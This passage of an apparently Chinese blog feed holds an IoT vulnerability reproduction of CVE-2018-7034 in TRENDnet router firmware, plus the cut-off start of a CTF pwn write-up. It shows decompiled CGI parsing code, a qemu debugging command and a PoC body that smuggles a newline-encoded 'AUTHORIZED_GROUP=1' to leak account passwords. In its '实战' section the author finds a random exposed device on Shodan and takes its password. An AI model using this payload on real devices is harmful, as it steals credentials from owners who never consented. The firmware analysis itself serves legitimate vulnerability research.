class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;uid&quot;</span>).<span class="string">&quot;&lt;/uid&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;name&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;name&quot;</span>).<span class="string">&quot;&lt;/name&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;usrid&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;usrid&quot;</span>).<span class="string">&quot;&lt;/usrid&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;password&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;password&quot;</span>).<span class="string">&quot;&lt;/password&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;group&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;group&quot;</span>).<span class="string">&quot;&lt;/group&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;description&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;description&quot;</span>).<span class="string">&quot;&lt;/description&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t&lt;/entry&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要AUTHORIZED_GROUP&#x3D;1就可以获得用户的敏感信息:密码</p><p>因为传入的数据都是先通过登录验证文件 <code>htdocs/cgibin</code> 的解析后，发送给 <code>php</code> 等文件进行处理，所以分析cgibin是如何设置该字段的，winmt师傅说由于这里的<code>webserver</code>运行的是<code>php</code>脚本，所以要着重看php部分</p><h2 id="环境的搭建"><a href="#环境的搭建" class="headerlink" title="环境的搭建"></a>环境的搭建</h2><p>固件的提取，这里使用的是TrendNet的固件TEW-715APO</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244911.png" alt="image-20240708110926473"></p><p>下载然后binwalk提取即可，但是这题搭建了系统qemu也没啥用，主要是太难以调试了，以系统模式的话，因此考虑的是<code>qemu-mipsel-static</code>用户级调试</p><h2 id="二进制文件的调用"><a href="#二进制文件的调用" class="headerlink" title="二进制文件的调用"></a>二进制文件的调用</h2><p>最终的调试指令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chroot</span> . ./qemu-mipsel-static -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  -E CONTENT_LENGTH=<span class="string">&quot;26214&quot;</span> -E REQUEST_URI=<span class="string">&quot;wtf?COOL&quot;</span> -g 1234 ./phpcgi 123</span><br></pre></td></tr></table></figure><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> (*v8)(); <span class="comment">// $t9</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  v3 = *argv;</span><br><span class="line">  v6 = <span class="built_in">strrchr</span>(*argv, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    v3 = v6 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;phpcgi&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = phpcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> (v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244912.png" alt="image-20240708111833108"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244913.png" alt="image-20240708123801112"></p><p>遍历环境变量之后的结果，会发现他好像将本机的env都搞出来了</p><p>着重注意第一个设置的结构体，显然是环境变量的所在处，然后必须为post请求，这样func函数才为sub_405AC0，这个函数之后会再次出现，只需记住即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">cgibin_parse_request</span><span class="params">(<span class="type">int</span> function, sodj *addr, <span class="type">unsigned</span> <span class="type">int</span> Maxnum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *CONTENT_LENGTH_ptr; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">char</span> *CONTENT_TYPE_ptr; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">char</span> **content_type_; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">size_t</span> len_1; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v14; <span class="comment">// $a1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_TYPE&quot;</span>) &amp;&amp; (CONTENT_LENGTH_ptr = <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_LENGTH&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">    len = <span class="built_in">atoi</span>(CONTENT_LENGTH_ptr);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="built_in">parse_uri</span>(function, addr);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Maxnum &gt;= len )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( len )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_TYPE&quot;</span>);</span><br><span class="line">        CONTENT_TYPE_ptr = <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_TYPE&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( CONTENT_TYPE_ptr )</span><br><span class="line">        &#123;</span><br><span class="line">          content_type_ = &amp;off_433014;</span><br><span class="line">          v11 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v14 = *content_type_;</span><br><span class="line">            <span class="keyword">if</span> ( !*content_type_ )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            len_1 = content_type_[<span class="number">1</span>];</span><br><span class="line">            content_type_ += <span class="number">3</span>;</span><br><span class="line">            ++v11;</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strncasecmp</span>(CONTENT_TYPE_ptr, v14, len_1) )</span><br><span class="line">              <span class="keyword">return</span> ((&amp;off_433014)[<span class="number">3</span> * v11 - <span class="number">1</span>])(function, addr, len, &amp;CONTENT_TYPE_ptr[len_1]);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_4033E8</span>(len);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会遍历<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244914.png" alt="image-20240708112411987">这部分内容，相应的请求方式执行对应的函数</p><p>发现除了Application形式的剩下的所有的返回值都是-1，返回到主函数就直接退出了，因此仔细看sub_40445C</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_40445C</span><span class="params">(<span class="type">int</span> funct, sodj *addr, <span class="type">int</span> CONTENT_LENGTH_ptr, <span class="type">const</span> <span class="type">char</span> *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncasecmp</span>(a4, <span class="string">&quot;x-www-form-urlencoded&quot;</span>, <span class="number">0x15</span>u) )<span class="comment">// 如果是x-www-form-urlencoded形式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_403A0C</span>(funct, addr, CONTENT_LENGTH_ptr);</span><br><span class="line">  <span class="built_in">sub_4033E8</span>(CONTENT_LENGTH_ptr);</span><br><span class="line">  <span class="built_in">sub_4040E0</span>(<span class="string">&quot;read_ct_application&quot;</span>, a4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然是application&#x2F;x-www-form-urlencoded的post请求会调用sub_403A0C</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244915.png" alt="image-20240708112718662"></p><p>其中read读入的便是我们的Poc，调试的话直接输入到远程页面即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_403864</span><span class="params">(_DWORD *a1, <span class="type">int</span> data_addr, <span class="type">unsigned</span> <span class="type">int</span> more_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> thelen; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $v1</span></span><br><span class="line">  <span class="built_in">void</span> (__fastcall *func)(<span class="type">int</span>, <span class="type">int</span> *); <span class="comment">// $t9</span></span><br><span class="line">  <span class="type">int</span> export_addr; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> one; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// $a1</span></span><br><span class="line">  sodj *sodj; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *oneaddr; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v16[<span class="number">4</span>]; <span class="comment">// [sp+18h] [-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( data_addr )</span><br><span class="line">  &#123;</span><br><span class="line">    thelen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( more_len )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = thelen &lt; more_len;</span><br><span class="line">        <span class="keyword">if</span> ( thelen &gt;= more_len )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        oneaddr = (data_addr + thelen);</span><br><span class="line">        one = *(data_addr + thelen);</span><br><span class="line">        <span class="keyword">if</span> ( *a1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = *oneaddr;</span><br><span class="line">          <span class="keyword">if</span> ( one == <span class="string">&#x27;&amp;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">sub_403864</span>(a1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">          &#125;</span><br><span class="line">          sodj = a1[<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v13 = *oneaddr;</span><br><span class="line">          <span class="keyword">if</span> ( one == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            *a1 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">          &#125;</span><br><span class="line">          sodj = a1[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sobj_add_char</span>(sodj, v13);               <span class="comment">// 将第一个等号前面的内容存到sodj1 等号后面的存到sodj2</span></span><br><span class="line">LABEL_15:</span><br><span class="line">        ++thelen;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">sobj_empty</span>(a1[<span class="number">1</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sobj_unescape_uri</span>(a1[<span class="number">1</span>]);                 <span class="comment">// 将%xx解码为ASCII码</span></span><br><span class="line">      <span class="built_in">sobj_unescape_uri</span>(a1[<span class="number">2</span>]);</span><br><span class="line">      v7 = a1[<span class="number">1</span>];</span><br><span class="line">      v8 = a1[<span class="number">2</span>];</span><br><span class="line">      func = a1[<span class="number">3</span>];</span><br><span class="line">      export_addr = a1[<span class="number">4</span>];</span><br><span class="line">      v16[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      v16[<span class="number">1</span>] = v7;</span><br><span class="line">      v16[<span class="number">2</span>] = v8;</span><br><span class="line">      <span class="built_in">func</span>(export_addr, v16);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sobj_free</span>(a1[<span class="number">1</span>]);</span><br><span class="line">  result = <span class="built_in">sobj_free</span>(a1[<span class="number">2</span>]);</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会发现它将&#x3D;两边的东西都分别存储到对应的地方，而之后对%xx进行了解码之后再次调用func就是之前的那个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_405AC0</span><span class="params">(sodj *glocal_addr, _DWORD *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *string; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v10; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// $a1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *addr )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *addr != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, <span class="string">&quot;_FILES_&quot;</span>);</span><br><span class="line">    string = <span class="built_in">sobj_get_string</span>(addr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, string);</span><br><span class="line">    <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">    v8 = addr[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">      v9 = <span class="built_in">sobj_get_string</span>(v8);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v9 = &amp;off_420798;</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, v9);</span><br><span class="line">    <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, <span class="string">&quot;_FILETYPES_&quot;</span>);</span><br><span class="line">    v10 = <span class="built_in">sobj_get_string</span>(addr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, v10);</span><br><span class="line">    <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="number">61</span>);</span><br><span class="line">    v6 = addr[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = &amp;off_420798;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, <span class="string">&quot;_POST_&quot;</span>);</span><br><span class="line">    v5 = <span class="built_in">sobj_get_string</span>(addr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, v5);</span><br><span class="line">    <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="number">61</span>);</span><br><span class="line">    v6 = addr[<span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = <span class="built_in">sobj_get_string</span>(v6);</span><br><span class="line">LABEL_11:</span><br><span class="line">  <span class="built_in">sobj_add_string</span>(glocal_addr, v11);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现就是将结构体的内容存到环境变量里</p><h2 id="POC的书写"><a href="#POC的书写" class="headerlink" title="POC的书写"></a>POC的书写</h2><p>因此我们可以构造一个Poc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SERVICES=DEVICE.ACCOUNT%<span class="number">0</span>aAUTHORIZED_GROUP=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>shodan随便找一个<a href="https://www.shodan.io/search?query=tew-751dr">shodan</a></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244916.png" alt="image-20240708113738832"></p><p>就获得了他的密码</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7034">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7034</a></p><p><a href="https://www.iotsec-zone.com/article/384">https://www.iotsec-zone.com/article/384</a></p><p><a href="https://zikh26.github.io/posts/5f982ad5.html">https://zikh26.github.io/posts/5f982ad5.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>题录1.2</title>
    <link href="http://s1nec-1o.github.io/2024/06/19/%E9%A2%98%E5%BD%951-2/"/>
    <id>http://s1nec-1o.github.io/2024/06/19/%E9%A2%98%E5%BD%951-2/</id>
    <published>2024-06-19T04:54:02.000Z</published>
    <updated>2024-06-19T04:59:16.786Z</updated>
    
    <content type="html"><![CDATA[<h1 id="刷题记录3"><a href="#刷题记录3" class="headerlink" title="刷题记录3"></a>刷题记录3</h1><h1 id="GDOUCTF-2023-Random"><a href="#GDOUCTF-2023-Random" class="headerlink" title="[GDOUCTF 2023]Random"></a>[GDOUCTF 2023]Random</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258821.png" alt="image-20240514212207480"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258823.png" alt="image-20240514212258989"></p><p>显然ORW</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  v7 = <span class="number">100</span>;</span><br><span class="line">  sandbox();</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = rand() % <span class="number">50</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please input a guess num:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5) == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;good guys&quot;</span>);</span><br><span class="line">      vulnerable();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no,no,no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是一个猜随机数，然后vul函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 